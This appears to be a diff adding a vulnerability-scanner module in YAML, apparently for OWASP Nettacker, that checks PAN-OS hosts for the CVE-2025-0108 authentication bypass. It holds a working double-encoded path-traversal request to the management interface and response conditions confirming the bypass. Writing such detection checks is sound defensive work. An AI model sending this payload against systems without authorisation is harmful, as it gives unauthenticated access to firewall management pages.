@@ -1,0 +1,59 @@
+info:
+  name: paloalto_panos_cve_2025_0108_vuln
+  author: OWASP Nettacker team 
+  severity: 8.8
+  description: CVE-2025-0108 is an authentication bypass in the Palo Alto Networks PAN-OS software, which enables an unauthenticated attacker with network access to the management web interface to bypass the authentication
+  reference: 
+    - https://security.paloaltonetworks.com/CVE-2025-0108
+    - https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os
+    - https://www.bleepingcomputer.com/news/security/hackers-exploit-authentication-bypass-in-palo-alto-networks-pan-os/
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - cve
+    - paloalto
+    - paloalto_panos
+    - panos
+  
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:  
+                - "unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 4443
+                - 8443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            header:
+              Content-Type: 
+                regex: text/html
+                reverse: false
+            content:
+              regex: "Zero Touch Provisioning"
+              reverse: false
